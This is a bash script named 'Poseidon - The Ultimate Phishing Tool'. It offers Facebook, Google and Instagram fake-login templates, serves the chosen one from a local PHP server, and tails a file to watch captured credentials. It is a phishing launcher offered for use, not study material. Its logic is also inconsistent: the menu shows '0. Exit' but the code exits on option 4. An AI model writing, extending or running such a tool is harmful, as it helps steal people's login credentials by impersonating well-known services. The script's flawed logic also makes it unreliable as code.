#!/bin/bash

# Function to display the main menu
show_menu() {
    echo -e "\n\033[1;32mPoseidon - The Ultimate Phishing Tool\033[0m"
    echo -e "\nSelect a template:"
    echo "1. Facebook"
    echo "2. Google"
    echo "3. Instagram"
    echo "0. Exit"
}

# Function to start the phishing server
start_server() {
    local template=$1
    local port=$2

    echo -e "\nStarting PHP server for $template phishing page on port $port..."
    php -S 127.0.0.1:$port -t templates/$template/ > /dev/null 2>&1 &

    echo -e "\nPhishing page is live at: \033[1;34mhttp://127.0.0.1:$port\033[0m"
    echo -e "Press \033[1;31mCtrl+C\033[0m to stop the server.\n"

    # Monitor the PHP server logs for captured credentials
    echo -e "Monitoring captured credentials...\n"
    tail -f templates/$template/websites/$template.php
}

# Main script logic
while true; do
    show_menu
    read -p "Choose an option: " option

    case $option in
        1) template="facebook" ;;
        2) template="google" ;;
        3) template="instagram" ;;
        4) echo -e "\nExiting Poseidon. Goodbye!\n"; exit 0 ;;
        *) echo -e "\nInvalid option! Please try again.\n"; continue ;;
    esac

    # Ask for the port number
    read -p "Enter the port number to host the website on (e.g., 8080): " port

    # Validate the port number
    if ! [[ $port =~ ^[0-9]+$ ]]; then
        echo -e "\nInvalid port number! Please enter a valid number.\n"
        continue
    fi

    # Start the server with the selected template and port
    start_server $template $port
done